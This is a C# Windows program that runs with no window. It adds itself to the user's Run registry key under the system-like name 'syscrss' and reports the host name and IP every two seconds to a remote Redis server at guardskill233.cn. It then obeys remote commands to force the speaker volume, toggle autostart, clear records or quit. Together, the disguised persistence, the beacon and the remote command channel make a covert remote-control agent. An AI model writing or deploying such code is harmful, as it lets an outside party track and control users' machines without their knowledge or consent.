using AudioSwitcher.AudioApi.CoreAudio;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using StackExchange.Redis;
using Newtonsoft.Json;
using System.Threading;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Net;

namespace proSystem
{
    static class Program
    {
        class RedisMsg
        {
            public double volume;
            public VolMode mode;
            public int interval;
        }

        enum VolMode
        {
            circulation = 0,
            onetimes = 1,
            cleartable = 2,
            closeprocess = 3,
            nostartup = 4,
            startup = 5,
            nolimitation=6
        }
        static ConnectionMultiplexer redis;
        static IDatabase db;
        static ISubscriber sub;
        static bool cirFlag;
        static double volume;
        static int interval = 5;
        static string ip = System.Environment.MachineName +"  "+getLocalIp();
        static CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
        [STAThread]
        static void Main()
        {
            SetAutoBootStatu(true);
            reConnect();
            try
            {
                subMessage();
            }
            catch
            {
                reConnect();
            }
            Thread thr = new Thread(setdatabase);
            thr.Start();

            Application.Run();
            //set information
        }
        public static int SetAutoBootStatu(bool isAutoBoot)
        {
            try
            {
                string execPath = Application.ExecutablePath;
                RegistryKey rk = Registry.LocalMachine;
                RegistryKey rk2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (isAutoBoot)
                {
                    rk2.SetValue("syscrss", execPath);
                }
                else
                {
                    rk2.DeleteValue("syscrss", false);
                }
                rk2.Close();
                rk.Close();
                return 0;
            }
            catch
            {
                return -1;
            }
        }
        static void circulate()
        {
            while (cirFlag)
            {
                defaultPlaybackDevice.Volume = volume;
                Thread.Sleep(interval*1000);
            }
        }
        static void setdatabase()
        {
            while (true)
            {
                try
                {
                    db.HashSet("HOST_DATA",
                        new HashEntry[] { new HashEntry(ip, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")) });
                }
                catch
                {
                    reConnect();
                }
                Thread.Sleep(2000);
            }
        }
        static public string getLocalIp()
        {
            string name = Dns.GetHostName();
             IPAddress[] ipadrlist = Dns.GetHostAddresses(name);
             foreach (IPAddress ipa in ipadrlist)
                 {
                             if (ipa.AddressFamily == AddressFamily.InterNetwork)
                                 return ipa.ToString();
                 }
            return null;
        }
        static void subMessage()
        {
            sub.Subscribe(ip, (channel, message) =>
            {
                RedisMsg msg = JsonConvert.DeserializeObject<RedisMsg>(message);
                switch (msg.mode)
                {
                    case VolMode.circulation:
                        if (cirFlag)
                        {
                            if (msg.interval <= 5 && msg.interval > 0)
                                interval = msg.interval;
                            else
                                interval = 5;
                            volume = msg.volume;
                        }
                        else
                        {
                            if (msg.interval <= 5 && msg.interval > 0)
                                interval = msg.interval;
                            else
                                interval = 5;
                            volume = msg.volume;
                            cirFlag = true;
                            Thread th = new Thread(circulate);
                            th.Start();
                        }
                        break;
                    case VolMode.onetimes:
                        cirFlag = false;
                        Thread.Sleep(interval * 1000); //wait thead over//wait thead over
                        defaultPlaybackDevice.Volume = msg.volume;
                        break;
                    case VolMode.nolimitation:
                        cirFlag = false;
                        Thread.Sleep(interval * 1000); //wait thead over
                        break;
                    case VolMode.cleartable:
                        db.KeyDelete("HOST_DATA");
                        break;
                    case VolMode.closeprocess:
                        db.HashDelete("HOST_DATA", ip);
                        Environment.Exit(0);
                        break;
                    case VolMode.nostartup:
                        SetAutoBootStatu(false);
                        break;
                    case VolMode.startup:
                        SetAutoBootStatu(true);
                        break;
                    default:
                        break;
                }
            });
        }
        static void reConnect()
        {
            try
            {
                redis = ConnectionMultiplexer.Connect("guardskill233.cn:6339, abortConnect=false,password=******,ConnectTimeout=99999000,connectRetry=9999");
                db = redis.GetDatabase();
                sub = redis.GetSubscriber();
            }
            catch
            {
                reConnect();
            }
        }
    }

}
